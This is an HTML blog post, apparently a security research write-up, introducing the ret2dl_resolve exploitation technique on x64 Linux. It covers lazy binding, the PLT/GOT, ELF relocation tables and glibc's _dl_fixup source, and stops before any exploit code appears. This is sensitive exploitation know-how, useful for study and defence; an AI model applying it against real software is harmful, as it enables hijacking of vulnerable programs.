@@ -1,0 +1,1304 @@
+
+<!DOCTYPE html>
+<html>
+<head>
+
+    <!-- Document Settings -->
+    <meta charset="utf-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+
+    <!-- Base Meta -->
+    <!-- dynamically fixing the title for tag/author pages -->
+
+
+
+    <title>Ret2dl_resolve x64</title>
+    <meta name="HandheldFriendly" content="True" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <!-- Styles'n'Scripts -->
+    <link rel="stylesheet" type="text/css" href="/assets/built/screen.css" />
+    <link rel="stylesheet" type="text/css" href="/assets/built/screen.edited.css" />
+    <link rel="stylesheet" type="text/css" href="/assets/built/syntax.css" />
+    <!-- highlight.js -->
+    <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/styles/default.min.css">
+    <style>.hljs { background: none; }</style>
+
+    <!--[if IE]>
+        <style>
+            p, ol, ul{
+                width: 100%;
+            }
+            blockquote{
+                width: 100%;
+            }
+        </style>
+    <![endif]-->
+
+    <!-- This tag outputs SEO meta+structured data and other important settings -->
+    <meta name="description" content="In this article, we will start analyzing the lazy binding process, we will proceed dissecting dl-runtime, understanding when is possible to use this technique without a leak, and finally we will build our exploit." />
+    <meta name="keywords" content="ret2dl, ret2dl-resolve, ret2dl_resolve, ret2dl resolve">
+    <link rel="shortcut icon" href="https://syst3mfailure.io/assets/images/favicon.png" type="image/png" />
+    <link rel="canonical" href="https://syst3mfailure.io/ret2dl_resolve" />
+    <meta name="referrer" content="no-referrer-when-downgrade" />
+
+     <!--title below is coming from _includes/dynamic_title-->
+    <meta property="og:site_name" content="Syst3m Failure" />
+    <meta property="og:type" content="website" />
+    <meta property="og:title" content="Ret2dl_resolve x64" />
+    <meta property="og:description" content="In this article, we will start analyzing the lazy binding process, we will proceed dissecting dl-runtime, understanding when is possible to use this technique without a leak, and finally we will build our exploit." />
+    <meta property="og:url" content="https://syst3mfailure.io/ret2dl_resolve" />
+    <meta property="og:image" content="https://syst3mfailure.io/assets/images/ret2dl_resolve/title.jpg" />
+    <meta property="article:publisher" content="https://www.facebook.com/" />
+    <meta property="article:author" content="https://www.facebook.com/" />
+    <meta property="article:published_time" content="2020-05-12T09:00:00+02:00" />
+    <meta property="article:modified_time" content="2020-05-12T09:00:00+02:00" />
+    <meta property="article:tag" content="Research" />
+    <meta name="twitter:card" content="summary_large_image" />
+    <meta name="twitter:title" content="Ret2dl_resolve x64" />
+    <meta name="twitter:description" content="In this article, we will start analyzing the lazy binding process, we will proceed dissecting dl-runtime, understanding when is possible to use this technique without a leak, and finally we will build our exploit." />
+    <meta name="twitter:url" content="https://syst3mfailure.io/" />
+    <meta name="twitter:image" content="https://syst3mfailure.io/assets/images/ret2dl_resolve/title.jpg" />
+    <meta name="twitter:label1" content="Written by" />
+    <meta name="twitter:data1" content="Syst3m Failure" />
+    <meta name="twitter:label2" content="Filed under" />
+    <meta name="twitter:data2" content="Research" />
+    <meta name="twitter:site" content="@" />
+    <meta name="twitter:creator" content="@" />
+    <meta property="og:image:width" content="1400" />
+    <meta property="og:image:height" content="933" />
+
+    <script type="application/ld+json">
+{
+    "@context": "https://schema.org",
+    "@type": "Website",
+    "publisher": {
+        "@type": "Organization",
+        "name": "Syst3m Failure",
+        "logo": "https://syst3mfailure.io/assets/images/sflogo.png"
+    },
+    "url": "https://syst3mfailure.io/ret2dl_resolve",
+    "image": {
+        "@type": "ImageObject",
+        "url": "https://syst3mfailure.io/assets/images/ret2dl_resolve/title.jpg",
+        "width": 2000,
+        "height": 666
+    },
+    "mainEntityOfPage": {
+        "@type": "WebPage",
+        "@id": "https://syst3mfailure.io/ret2dl_resolve"
+    },
+    "description": "In this article, we will start analyzing the lazy binding process, we will proceed dissecting dl-runtime, understanding when is possible to use this technique without a leak, and finally we will build our exploit. The lazy binding When we run a program on Linux, as default behavior, the dynamic linker"
+}
+    </script>
+
+    <!-- <script type="text/javascript" src="https://demo.ghost.io/public/ghost-sdk.min.js?v=724281a32e"></script>
+    <script type="text/javascript">
+    ghost.init({
+    	clientId: "ghost-frontend",
+    	clientSecret: "f84a07a72b17"
+    });
+    </script> -->
+
+    <meta name="generator" content="Jekyll 3.6.2" />
+    <link rel="alternate" type="application/rss+xml" title="Ret2dl_resolve x64" href="/feed.xml" />
+
+
+</head>
+<body class="post-template">
+
+    <div class="site-wrapper">
+        <!-- All the main content gets inserted here, index.hbs, post.hbs, etc -->
+        <!-- default -->
+
+<!-- The tag above means: insert everything in this file
+into the {body} of the default.hbs template -->
+
+<header class="site-header outer">
+    <div class="inner">
+        <nav class="site-nav">
+    <div class="site-nav-left">
+        
+            
+                <a class="site-nav-logo" href="https://syst3mfailure.io/"><img src="/assets/images/sflogo.png" alt="Syst3m Failure" /></a>
+            
+        
+        
+            <ul class="nav" role="menu">
+    <li class="nav-home" role="menuitem"><a href="/">Home</a></li>
+    <li class="nav-getting-started" role="menuitem"><a href="/tag/research/">Research</a></li>
+    <li class="nav-getting-started" role="menuitem"><a href="/tag/ctf/">CTF</a></li>
+    <li class="nav-getting-started" role="menuitem"><a href="/tag/various/">Various</a></li>
+    <li class="nav-about" role="menuitem"><a href="/about/">About</a></li>
+</ul>
+
+        
+    </div>
+    <div class="site-nav-right">
+        <div class="social-links">
+            
+            
+        </div>
+        
+    </div>
+</nav>
+
+    </div>
+</header>
+
+<!-- Everything inside the #post tags pulls data from the post -->
+<!-- #post -->
+
+<main id="site-main" class="site-main outer" role="main">
+    <div class="inner">
+
+        <article class="post-full post tag-Research ">
+
+            <header class="post-full-header">
+                <section class="post-full-meta">
+                    <time class="post-full-meta-date" datetime="12 May 2020">12 May 2020</time>
+                    
+                        <span class="date-divider">/</span>
+                        
+                            
+                               <a href='/tag/research/'>RESEARCH</a>
+                            
+                        
+                    
+                </section>
+                <h1 class="post-full-title">Ret2dl_resolve x64</h1>
+            </header>
+
+            
+            <figure class="post-full-image" style="background-image: url(/assets/images/ret2dl_resolve/title.jpg)">
+            </figure>
+            
+
+            <section class="post-full-content">
+                <div class="kg-card-markdown">
+                    <p>In this article, we will start analyzing the lazy binding process, we will proceed dissecting dl-runtime, understanding when is possible to use this technique without a leak, and finally we will build our exploit.</p>
+
+<h3 id="the-lazy-binding">The lazy binding</h3>
+
+<p>When we run a program on Linux, as default behavior, the dynamic linker resolves references to symbols in the shared libraries only when it’s needed.
+In other words, the program doesn’t know the address of a specific function in a shared library, until this function is actually referenced.</p>
+
+<p>This process of resolving symbols in run-time, is known as lazy binding.</p>
+
+<p>We can also modify this behavior, forcing the dynamic linker to perform all relocations at program startup, exporting an environment variable called LD_BIND_NOW. Indeed, as we can see in <a href="http://man7.org/linux/man-pages/man8/ld.so.8.html">ld.so man page</a>:</p>
+
+<figure class="highlight"><pre><code class="language-rouge" data-lang="rouge">LD_BIND_NOW (since glibc 2.1.1)
+    If set to a nonempty string, causes the dynamic linker to
+    resolve all symbols at program startup instead of deferring
+    function call resolution to the point when they are first ref‐
+    erenced.  This is useful when using a debugger.</code></pre></figure>
+
+<p>Two of the most important sections involved in the lazy binding process, are respectively called <strong>Procedure Linkage Table (PLT)</strong> and <strong>Global Offset Table (GOT).</strong></p>
+
+<p>The <strong>PLT</strong> section, contains executable code and consist of well-defined format stubs.
+These stubs can be distinguish in a default stub and a series of function stubs.
+As we can see from the <strong>objdump</strong> output, we have a default stub at <strong>0x401020</strong> followed by a function stub (<strong>read()</strong> in our case) at <strong>0x401030</strong>.</p>
+
+<figure class="highlight"><pre><code class="language-rouge" data-lang="rouge">objdump -d poc -j .plt -M intel</code></pre></figure>
+
+<figure class="highlight"><pre><code class="language-rouge" data-lang="rouge">Disassembly of section .plt:
+
+0000000000401020 &lt;.plt&gt;:
+  401020:	ff 35 e2 2f 00 00    	push   QWORD PTR [rip+0x2fe2]  # 404008 &lt;_GLOBAL_OFFSET_TABLE_+0x8&gt;
+  401026:	ff 25 e4 2f 00 00    	jmp    QWORD PTR [rip+0x2fe4]  # 404010 &lt;_GLOBAL_OFFSET_TABLE_+0x10&gt;
+  40102c:	0f 1f 40 00          	nop    DWORD PTR [rax+0x0]
+
+0000000000401030 &lt;read@plt&gt;:
+  401030:	ff 25 e2 2f 00 00    	jmp    QWORD PTR [rip+0x2fe2]  # 404018 &lt;read@GLIBC_2.2.5&gt;
+  401036:	68 00 00 00 00       	push   0x0
+  40103b:	e9 e0 ff ff ff       	jmp    401020 &lt;.plt&gt;</code></pre></figure>
+
+<p>The <strong>GOT</strong> is a data section and it will be populated in run-time with the addresses of the resolved symbols.
+It will also contain important addresses that will be used in the symbols resolution process: the <strong>link_map</strong> structure address and the <strong>_dl_runtime_resolve</strong> address, which we will cover shortly.</p>
+
+<figure class="highlight"><pre><code class="language-rouge" data-lang="rouge">objdump -d poc -j .got.plt -M intel -z
+
+Disassembly of section .got.plt:
+
+0000000000404000 &lt;_GLOBAL_OFFSET_TABLE_&gt;:
+  404000:	20 3e 40 00 00 00 00 00 00 00 00 00 00 00 00 00      &gt;@.............
+  404010:	00 00 00 00 00 00 00 00 36 10 40 00 00 00 00 00     ........6.@.....</code></pre></figure>
+
+<p>Let’s see what happens when read() is called:</p>
+
+<p><img src="/assets/images/ret2dl_resolve/lazy_binding.png" alt="lazy_binding" class="img-responsive" /></p>
+
+<ol>
+  <li>
+    <p>From the .text section, instead of calling read directly, there is a call to the corresponding function stub in the .plt section (0x401030).</p>
+  </li>
+  <li>
+    <p>From here, there is an indirect jump in the .got.plt section (0x404018). Since the symbol has not been resolved yet, this address contains the address of the next instruction in the function stub (0x401036).</p>
+  </li>
+  <li>
+    <p>At this point, the execution flow is redirected to the next instruction in the function stub. Here, reloc_arg is pushed on the stack.</p>
+  </li>
+  <li>
+    <p>The last instruction in the function stub is an indirect jump to the default stub (0x401020). Here the link_map address is pushed on the stack and finally the control is given to _dl_runtime_resolve.</p>
+  </li>
+</ol>
+
+<p>We will talk about reloc_arg and link_map in the next section.</p>
+
+<p>_dl_runtime_resolve is defined in <a href="https://code.woboq.org/userspace/glibc/sysdeps/x86_64/dl-trampoline.S.html#_M/_dl_runtime_resolve">dl-trampoline.S</a> and its definition is followed by the inclusion of <a href="https://code.woboq.org/userspace/glibc/sysdeps/x86_64/dl-trampoline.h.html">dl-trampoline.h</a>. Using gdb, we can immediately understand what it does:</p>
+
+<figure class="highlight"><pre><code class="language-nasm" data-lang="nasm"><span class="mh">0x7ffff7fe93c0</span> <span class="o">&lt;</span><span class="n">_dl_runtime_resolve_xsave</span><span class="o">&gt;:</span>	<span class="k">push</span>   <span class="n">rbx</span>
+<span class="mh">0x7ffff7fe93c1</span> <span class="o">&lt;</span><span class="n">_dl_runtime_resolve_xsave</span><span class="o">+</span><span class="mi">1</span><span class="o">&gt;:</span>	<span class="k">mov</span>    <span class="n">rbx</span><span class="p">,</span><span class="n">rsp</span>
+<span class="mh">0x7ffff7fe93c4</span> <span class="o">&lt;</span><span class="n">_dl_runtime_resolve_xsave</span><span class="o">+</span><span class="mi">4</span><span class="o">&gt;:</span>	<span class="k">and</span>    <span class="n">rsp</span><span class="p">,</span><span class="mh">0xffffffffffffffc0</span>
+<span class="mh">0x7ffff7fe93c8</span> <span class="o">&lt;</span><span class="n">_dl_runtime_resolve_xsave</span><span class="o">+</span><span class="mi">8</span><span class="o">&gt;:</span>	<span class="k">sub</span>    <span class="n">rsp</span><span class="p">,</span><span class="n">QWORD</span> <span class="n">PTR</span> <span class="err">[</span><span class="n">rip</span><span class="o">+</span><span class="mh">0x13379</span><span class="err">]</span> <span class="c1">// 0x7ffff7ffc748 &lt;_rtld_global_ro+232&gt;
+</span><span class="mh">0x7ffff7fe93cf</span> <span class="o">&lt;</span><span class="n">_dl_runtime_resolve_xsave</span><span class="o">+</span><span class="mi">15</span><span class="o">&gt;:</span>	<span class="k">mov</span>    <span class="n">QWORD</span> <span class="n">PTR</span> <span class="p">[rsp],</span><span class="n">rax</span>
+<span class="mh">0x7ffff7fe93d3</span> <span class="o">&lt;</span><span class="n">_dl_runtime_resolve_xsave</span><span class="o">+</span><span class="mi">19</span><span class="o">&gt;:</span>	<span class="k">mov</span>    <span class="n">QWORD</span> <span class="n">PTR</span> <span class="err">[</span><span class="n">rsp</span><span class="o">+</span><span class="mh">0x8</span><span class="err">]</span><span class="p">,</span><span class="n">rcx</span>
+<span class="mh">0x7ffff7fe93d8</span> <span class="o">&lt;</span><span class="n">_dl_runtime_resolve_xsave</span><span class="o">+</span><span class="mi">24</span><span class="o">&gt;:</span>	<span class="k">mov</span>    <span class="n">QWORD</span> <span class="n">PTR</span> <span class="err">[</span><span class="n">rsp</span><span class="o">+</span><span class="mh">0x10</span><span class="err">]</span><span class="p">,</span><span class="n">rdx</span>
+<span class="mh">0x7ffff7fe93dd</span> <span class="o">&lt;</span><span class="n">_dl_runtime_resolve_xsave</span><span class="o">+</span><span class="mi">29</span><span class="o">&gt;:</span>	<span class="k">mov</span>    <span class="n">QWORD</span> <span class="n">PTR</span> <span class="err">[</span><span class="n">rsp</span><span class="o">+</span><span class="mh">0x18</span><span class="err">]</span><span class="p">,</span><span class="n">rsi</span>
+<span class="mh">0x7ffff7fe93e2</span> <span class="o">&lt;</span><span class="n">_dl_runtime_resolve_xsave</span><span class="o">+</span><span class="mi">34</span><span class="o">&gt;:</span>	<span class="k">mov</span>    <span class="n">QWORD</span> <span class="n">PTR</span> <span class="err">[</span><span class="n">rsp</span><span class="o">+</span><span class="mh">0x20</span><span class="err">]</span><span class="p">,</span><span class="n">rdi</span>
+<span class="mh">0x7ffff7fe93e7</span> <span class="o">&lt;</span><span class="n">_dl_runtime_resolve_xsave</span><span class="o">+</span><span class="mi">39</span><span class="o">&gt;:</span>	<span class="k">mov</span>    <span class="n">QWORD</span> <span class="n">PTR</span> <span class="err">[</span><span class="n">rsp</span><span class="o">+</span><span class="mh">0x28</span><span class="err">]</span><span class="p">,</span><span class="n">r8</span>
+<span class="mh">0x7ffff7fe93ec</span> <span class="o">&lt;</span><span class="n">_dl_runtime_resolve_xsave</span><span class="o">+</span><span class="mi">44</span><span class="o">&gt;:</span>	<span class="k">mov</span>    <span class="n">QWORD</span> <span class="n">PTR</span> <span class="err">[</span><span class="n">rsp</span><span class="o">+</span><span class="mh">0x30</span><span class="err">]</span><span class="p">,</span><span class="n">r9</span>
+<span class="mh">0x7ffff7fe93f1</span> <span class="o">&lt;</span><span class="n">_dl_runtime_resolve_xsave</span><span class="o">+</span><span class="mi">49</span><span class="o">&gt;:</span>	<span class="k">mov</span>    <span class="n">eax</span><span class="p">,</span><span class="mh">0xee</span>
+<span class="mh">0x7ffff7fe93f6</span> <span class="o">&lt;</span><span class="n">_dl_runtime_resolve_xsave</span><span class="o">+</span><span class="mi">54</span><span class="o">&gt;:</span>	<span class="k">xor</span>    <span class="n">edx</span><span class="p">,</span><span class="n">edx</span>
+<span class="mh">0x7ffff7fe93f8</span> <span class="o">&lt;</span><span class="n">_dl_runtime_resolve_xsave</span><span class="o">+</span><span class="mi">56</span><span class="o">&gt;:</span>	<span class="k">mov</span>    <span class="n">QWORD</span> <span class="n">PTR</span> <span class="err">[</span><span class="n">rsp</span><span class="o">+</span><span class="mh">0x240</span><span class="err">]</span><span class="p">,</span><span class="n">rdx</span>
+<span class="mh">0x7ffff7fe9400</span> <span class="o">&lt;</span><span class="n">_dl_runtime_resolve_xsave</span><span class="o">+</span><span class="mi">64</span><span class="o">&gt;:</span>	<span class="k">mov</span>    <span class="n">QWORD</span> <span class="n">PTR</span> <span class="err">[</span><span class="n">rsp</span><span class="o">+</span><span class="mh">0x248</span><span class="err">]</span><span class="p">,</span><span class="n">rdx</span>
+<span class="mh">0x7ffff7fe9408</span> <span class="o">&lt;</span><span class="n">_dl_runtime_resolve_xsave</span><span class="o">+</span><span class="mi">72</span><span class="o">&gt;:</span>	<span class="k">mov</span>    <span class="n">QWORD</span> <span class="n">PTR</span> <span class="err">[</span><span class="n">rsp</span><span class="o">+</span><span class="mh">0x250</span><span class="err">]</span><span class="p">,</span><span class="n">rdx</span>
+<span class="mh">0x7ffff7fe9410</span> <span class="o">&lt;</span><span class="n">_dl_runtime_resolve_xsave</span><span class="o">+</span><span class="mi">80</span><span class="o">&gt;:</span>	<span class="k">mov</span>    <span class="n">QWORD</span> <span class="n">PTR</span> <span class="err">[</span><span class="n">rsp</span><span class="o">+</span><span class="mh">0x258</span><span class="err">]</span><span class="p">,</span><span class="n">rdx</span>
+<span class="mh">0x7ffff7fe9418</span> <span class="o">&lt;</span><span class="n">_dl_runtime_resolve_xsave</span><span class="o">+</span><span class="mi">88</span><span class="o">&gt;:</span>	<span class="k">mov</span>    <span class="n">QWORD</span> <span class="n">PTR</span> <span class="err">[</span><span class="n">rsp</span><span class="o">+</span><span class="mh">0x260</span><span class="err">]</span><span class="p">,</span><span class="n">rdx</span>
+<span class="mh">0x7ffff7fe9420</span> <span class="o">&lt;</span><span class="n">_dl_runtime_resolve_xsave</span><span class="o">+</span><span class="mi">96</span><span class="o">&gt;:</span>	<span class="k">mov</span>    <span class="n">QWORD</span> <span class="n">PTR</span> <span class="err">[</span><span class="n">rsp</span><span class="o">+</span><span class="mh">0x268</span><span class="err">]</span><span class="p">,</span><span class="n">rdx</span>
+<span class="mh">0x7ffff7fe9428</span> <span class="o">&lt;</span><span class="n">_dl_runtime_resolve_xsave</span><span class="o">+</span><span class="mi">104</span><span class="o">&gt;:</span>	<span class="k">mov</span>    <span class="n">QWORD</span> <span class="n">PTR</span> <span class="err">[</span><span class="n">rsp</span><span class="o">+</span><span class="mh">0x270</span><span class="err">]</span><span class="p">,</span><span class="n">rdx</span>
+<span class="mh">0x7ffff7fe9430</span> <span class="o">&lt;</span><span class="n">_dl_runtime_resolve_xsave</span><span class="o">+</span><span class="mi">112</span><span class="o">&gt;:</span>	<span class="k">mov</span>    <span class="n">QWORD</span> <span class="n">PTR</span> <span class="err">[</span><span class="n">rsp</span><span class="o">+</span><span class="mh">0x278</span><span class="err">]</span><span class="p">,</span><span class="n">rdx</span>
+<span class="mh">0x7ffff7fe9438</span> <span class="o">&lt;</span><span class="n">_dl_runtime_resolve_xsave</span><span class="o">+</span><span class="mi">120</span><span class="o">&gt;:</span>	<span class="n">xsave</span>  <span class="err">[</span><span class="n">rsp</span><span class="o">+</span><span class="mh">0x40</span><span class="err">]</span> <span class="c1">// Save current processor state
+</span><span class="mh">0x7ffff7fe943d</span> <span class="o">&lt;</span><span class="n">_dl_runtime_resolve_xsave</span><span class="o">+</span><span class="mi">125</span><span class="o">&gt;:</span>	<span class="k">mov</span>    <span class="n">rsi</span><span class="p">,</span><span class="n">QWORD</span> <span class="n">PTR</span> <span class="err">[</span><span class="n">rbx</span><span class="o">+</span><span class="mh">0x10</span><span class="err">]</span> <span class="c1">// reloc_arg
+</span><span class="mh">0x7ffff7fe9441</span> <span class="o">&lt;</span><span class="n">_dl_runtime_resolve_xsave</span><span class="o">+</span><span class="mi">129</span><span class="o">&gt;:</span>	<span class="k">mov</span>    <span class="n">rdi</span><span class="p">,</span><span class="n">QWORD</span> <span class="n">PTR</span> <span class="err">[</span><span class="n">rbx</span><span class="o">+</span><span class="mh">0x8</span><span class="err">]</span> <span class="c1">// link_map
+</span><span class="mh">0x7ffff7fe9445</span> <span class="o">&lt;</span><span class="n">_dl_runtime_resolve_xsave</span><span class="o">+</span><span class="mi">133</span><span class="o">&gt;:</span>	<span class="k">call</span>   <span class="mh">0x7ffff7fe2a20</span> <span class="o">&lt;</span><span class="n">_dl_fixup</span><span class="o">&gt;</span> <span class="o">//</span> <span class="n">_dl_fixup</span><span class="p">(</span><span class="n">link_map</span><span class="p">,</span> <span class="n">reloc_arg</span><span class="p">)</span></code></pre></figure>
+
+<p>As we can see, it’s nothing more than a trampoline to _dl_fixup. It starts saving the current processor state, then moves reloc_arg in the RSI, link_map in the RDI (Following the x86_64 Linux calling conventions <a href="https://uclibc.org/docs/psABI-x86_64.pdf">AMD64 ABI</a>) and calls _dl_fixup. PS: The second instruction, moves RSP in RBX, in this way <code class="highlighter-rouge">QWORD PTR [rbx+0x10]</code> and <code class="highlighter-rouge">QWORD PTR [rbx+0x8]</code> before calling _dl_fixup, point respectively to reloc_arg and link_map, previously pushed on the stack.</p>
+
+<h3 id="dissecting-dl-runtime">Dissecting dl-runtime</h3>
+
+<p>Before starting our analysis, we need to introduce three more important sections: <strong>JMPREL</strong> (.rela.plt), <strong>DYNSYM</strong> (.dynsym) and <strong>STRTAB</strong> (.dynstr). (PS: .dynsym is the analogous to .symtab, but it contains information about dynamic linking rather than static linking. This also applies to .dynstr and .strtab)</p>
+
+<figure class="highlight"><pre><code class="language-rouge" data-lang="rouge">readelf --sections ./poc | egrep "Name|.rela.plt|.dynsym|.dynstr"
+
+  [Nr] Name              Type             Address           Offset
+  [ 5] .dynsym           DYNSYM           0000000000400328  00000328
+  [ 6] .dynstr           STRTAB           0000000000400388  00000388
+  [10] .rela.plt         RELA             0000000000400420  00000420</code></pre></figure>
+
+<p><strong>JMPREL</strong> (.rela.plt): It contains information used by the linker to perform relocations.
+It’s composed by 0x18 aligned <a href="https://code.woboq.org/userspace/glibc/elf/elf.h.html#Elf64_Rel">Elf64_Rel</a> structures.</p>
+
+<p><img src="/assets/images/ret2dl_resolve/elf64_rel.png" alt="elf64_rel" class="img-responsive" /></p>
+
+<ul>
+  <li><strong>r_offset</strong>: It contains the location where the address of the resolved symbol will be stored (In the GOT).</li>
+  <li><strong>r_info</strong>: Indicates the relocation type and acts as a symbol table index. It will be used to locate the corresponding Elf64_Sym structure in the DYNSYM section.</li>
+</ul>
+
+<p><strong>DYNSYM</strong> (.dynsym): It contains a symbol table. It’s composed by 0x18 aligned <a href="https://code.woboq.org/userspace/glibc/elf/elf.h.html#Elf64_Sym">Elf64_Sym</a> structures. Every structure associates a symbolic name with a piece of code elsewhere in the binary.</p>
+
+<p><img src="/assets/images/ret2dl_resolve/elf64_sym.png" alt="elf64_sym" class="img-responsive" /></p>
+
+<ul>
+  <li><strong>st_name</strong>: It acts as a string table index. It will be used to locate the right string in the STRTAB section.</li>
+  <li><strong>st_info</strong>: It contains symbol’s type and binding attributes.</li>
+  <li><strong>st_other</strong>: It contains symbol’s visibility.</li>
+  <li><strong>st_shndx</strong>: It contains the relevant section header table index.</li>
+  <li><strong>st_value</strong>: It contains the value of the associated symbol.</li>
+  <li><strong>st_size</strong>: It contains the symbol’s size. If the symbol has no size or the size is unknown, it contains 0.</li>
+</ul>
+
+<p><strong>STRTAB</strong> (.dynstr): The strings containing the symbolic names are located here.</p>
+
+<p><img src="/assets/images/ret2dl_resolve/strtab.png" alt="strtab" class="img-responsive" /></p>
+
+<p>Now we can start our analysis. <a href="https://code.woboq.org/userspace/glibc/elf/dl-runtime.c.html#_dl_fixup">_dl_fixup</a> is defined in dl-resolve.c as follow:</p>
+
+<figure class="highlight"><pre><code class="language-c" data-lang="c"><table class="rouge-table"><tbody><tr><td class="gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+35
+36
+37
+38
+39
+40
+41
+42
+43
+44
+45
+46
+47
+48
+49
+50
+51
+52
+53
+54
+55
+56
+57
+58
+59
+60
+61
+62
+63
+64
+65
+66
+67
+68
+69
+70
+71
+72
+73
+74
+75
+76
+77
+78
+79
+80
+81
+82
+83
+84
+85
+86
+</pre></td><td class="code"><pre><span class="p">...</span>
+
+<span class="n">_dl_fixup</span> <span class="p">(</span>
+
+<span class="cp"># ifdef ELF_MACHINE_RUNTIME_FIXUP_ARGS
+</span>      <span class="n">ELF_MACHINE_RUNTIME_FIXUP_ARGS</span><span class="p">,</span>
+<span class="cp"># endif
+</span>      <span class="k">struct</span> <span class="n">link_map</span> <span class="o">*</span><span class="n">l</span><span class="p">,</span> <span class="n">ElfW</span><span class="p">(</span><span class="n">Word</span><span class="p">)</span> <span class="n">reloc_arg</span>  <span class="p">){</span>
+
+<span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">strtab</span> <span class="o">=</span> <span class="p">(</span><span class="k">const</span> <span class="kt">void</span> <span class="o">*</span><span class="p">)</span> <span class="n">D_PTR</span><span class="p">(</span><span class="n">l</span><span class="p">,</span> <span class="n">l_info</span><span class="p">[</span><span class="n">DT_STRTAB</span><span class="p">]);</span>
+<span class="k">const</span> <span class="n">PLTREL</span> <span class="o">*</span><span class="k">const</span> <span class="n">reloc</span> <span class="o">=</span> <span class="p">(</span><span class="k">const</span> <span class="kt">void</span> <span class="o">*</span><span class="p">)</span> <span class="p">(</span><span class="n">D_PTR</span><span class="p">(</span><span class="n">l</span><span class="p">,</span> <span class="n">l_info</span><span class="p">[</span><span class="n">DT_JMPREL</span><span class="p">])</span> <span class="o">+</span> <span class="n">reloc_offset</span><span class="p">);</span>
+<span class="k">const</span> <span class="n">ElfW</span><span class="p">(</span><span class="n">Sym</span><span class="p">)</span> <span class="o">*</span><span class="n">sym</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">symtab</span><span class="p">[</span><span class="n">ELFW</span><span class="p">(</span><span class="n">R_SYM</span><span class="p">)</span> <span class="p">(</span><span class="n">reloc</span><span class="o">-&gt;</span><span class="n">r_info</span><span class="p">)];</span>
+<span class="k">const</span> <span class="n">ElfW</span><span class="p">(</span><span class="n">Sym</span><span class="p">)</span> <span class="o">*</span><span class="n">refsym</span> <span class="o">=</span> <span class="n">sym</span><span class="p">;</span>
+<span class="kt">void</span> <span class="o">*</span><span class="k">const</span> <span class="n">rel_addr</span> <span class="o">=</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)(</span><span class="n">l</span><span class="o">-&gt;</span><span class="n">l_addr</span> <span class="o">+</span> <span class="n">reloc</span><span class="o">-&gt;</span><span class="n">r_offset</span><span class="p">);</span>
+
+<span class="n">lookup_t</span> <span class="n">result</span><span class="p">;</span>
+<span class="n">DL_FIXUP_VALUE_TYPE</span> <span class="n">value</span><span class="p">;</span>
+
+<span class="cm">/* Sanity check that we're really looking at a PLT relocation.  */</span>
+<span class="n">assert</span> <span class="p">(</span><span class="n">ELFW</span><span class="p">(</span><span class="n">R_TYPE</span><span class="p">)(</span><span class="n">reloc</span><span class="o">-&gt;</span><span class="n">r_info</span><span class="p">)</span> <span class="o">==</span> <span class="n">ELF_MACHINE_JMP_SLOT</span><span class="p">);</span>
+
+<span class="cm">/* Look up the target symbol.  If the normal lookup rules are not
+   used don't look in the global scope.  */</span>
+<span class="k">if</span> <span class="p">(</span><span class="n">__builtin_expect</span> <span class="p">(</span><span class="n">ELFW</span><span class="p">(</span><span class="n">ST_VISIBILITY</span><span class="p">)</span> <span class="p">(</span><span class="n">sym</span><span class="o">-&gt;</span><span class="n">st_other</span><span class="p">),</span> <span class="mi">0</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span>
+<span class="p">{</span>
+   <span class="k">const</span> <span class="k">struct</span> <span class="n">r_found_version</span> <span class="o">*</span><span class="n">version</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
+
+   <span class="k">if</span> <span class="p">(</span><span class="n">l</span><span class="o">-&gt;</span><span class="n">l_info</span><span class="p">[</span><span class="n">VERSYMIDX</span> <span class="p">(</span><span class="n">DT_VERSYM</span><span class="p">)]</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">)</span>
+   <span class="p">{</span>
+     <span class="k">const</span> <span class="n">ElfW</span><span class="p">(</span><span class="n">Half</span><span class="p">)</span> <span class="o">*</span><span class="n">vernum</span> <span class="o">=</span> <span class="p">(</span><span class="k">const</span> <span class="kt">void</span> <span class="o">*</span><span class="p">)</span> <span class="n">D_PTR</span> <span class="p">(</span><span class="n">l</span><span class="p">,</span> <span class="n">l_info</span><span class="p">[</span><span class="n">VERSYMIDX</span> <span class="p">(</span><span class="n">DT_VERSYM</span><span class="p">)]);</span>
+     <span class="n">ElfW</span><span class="p">(</span><span class="n">Half</span><span class="p">)</span> <span class="n">ndx</span> <span class="o">=</span> <span class="n">vernum</span><span class="p">[</span><span class="n">ELFW</span><span class="p">(</span><span class="n">R_SYM</span><span class="p">)</span> <span class="p">(</span><span class="n">reloc</span><span class="o">-&gt;</span><span class="n">r_info</span><span class="p">)]</span> <span class="o">&amp;</span> <span class="mh">0x7fff</span><span class="p">;</span>
+     <span class="n">version</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">l</span><span class="o">-&gt;</span><span class="n">l_versions</span><span class="p">[</span><span class="n">ndx</span><span class="p">];</span>
+     <span class="k">if</span> <span class="p">(</span><span class="n">version</span><span class="o">-&gt;</span><span class="n">hash</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span>
+       <span class="n">version</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
+   <span class="p">}</span>
+
+   <span class="kt">int</span> <span class="n">flags</span> <span class="o">=</span> <span class="n">DL_LOOKUP_ADD_DEPENDENCY</span><span class="p">;</span>
+   <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">RTLD_SINGLE_THREAD_P</span><span class="p">)</span>
+   <span class="p">{</span>
+     <span class="n">THREAD_GSCOPE_SET_FLAG</span> <span class="p">();</span>
+     <span class="n">flags</span> <span class="o">|=</span> <span class="n">DL_LOOKUP_GSCOPE_LOCK</span><span class="p">;</span>
+   <span class="p">}</span>
+
+<span class="cp">#ifdef RTLD_ENABLE_FOREIGN_CALL
+</span>     <span class="n">RTLD_ENABLE_FOREIGN_CALL</span><span class="p">;</span>
+<span class="cp">#endif
+</span>
